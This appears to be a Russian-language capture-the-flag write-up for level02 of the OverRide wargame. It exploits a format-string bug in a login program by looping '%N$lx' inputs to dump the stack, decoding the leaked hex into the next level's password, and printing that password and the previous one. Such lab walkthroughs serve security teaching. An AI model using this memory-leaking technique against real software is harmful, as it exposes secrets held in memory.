[back](../defense.md)

```
su level02
Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Запускаем программу level02

```
level02@OverRide:~$ ./level02
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: admin
	--[ Password: admin
	*****************************************
	admin does not have access!
```

Нужен доступ. При этом в консоль выводится имя, мы вводим.  

Возможно, удастся использовать эту уязвимость.

Посмотрим код проги.

```
gdb level02
(gdb) disas main
	Dump of assembler code for function main:
	0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
	0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
	0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>
	0x0000000000400ab1 <+669>:	mov    $0x1,%edi
	0x0000000000400ab6 <+674>:	callq  0x400710 <exit@plt>	
	End of assembler dump.
```

Действительно вызывается printf. Попробуем распечатать стек.

Для этого используем оператор управления потоком, перенаправляя данные в нашу прогу и отсортировывая лишнее:

```
for i in {1..80}; do echo \%$i\$lx | ~/level02 | grep "does not have access"; done
	0 does not have access!
	0 does not have access!
	0 does not have access!
	100000000 does not have access!
	0 does not have access!
	756e505234376848 does not have access!
	45414a3561733951 does not have access!
	377a7143574e6758 does not have access!
	354a35686e475873 does not have access!
	48336750664b394d does not have access!
	0 does not have access!
	786c24383225 does not have access!
	0 does not have access!
	0 does not have access!
```

Среди прочего находим строки, содержащие шестнадцетеричный код.

Перевернем их и переведем через таблицу ASCII символов.

1.	756e505234376848 => 4868373452506e75 => Hh74RPnu

2.	45414a3561733951 => 51397361354a4145 => Q9sa5JAE

3.	377a7143574e6758 => 58674e5743717a37 => XgNWCqz7

4.	354a35686e475873 => 7358476e68354a35 => sXGnh5J5

5.	48336750664b394d => d4394b6650673348 => M9KfPg3H

```
level02@OverRide:~$ python -c "print ''.join([v.decode('hex')[::-1] for v in ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']])"
	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H, проверим, подходит ли пароль к следующему уровню.

```
level02@OverRide:~$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
level03@OverRide:~$
```

Доступ открыт.

```
level03@OverRide:~$ cd /home/users/level03
level03@OverRide:~$ ls
```

[back](../defense.md)
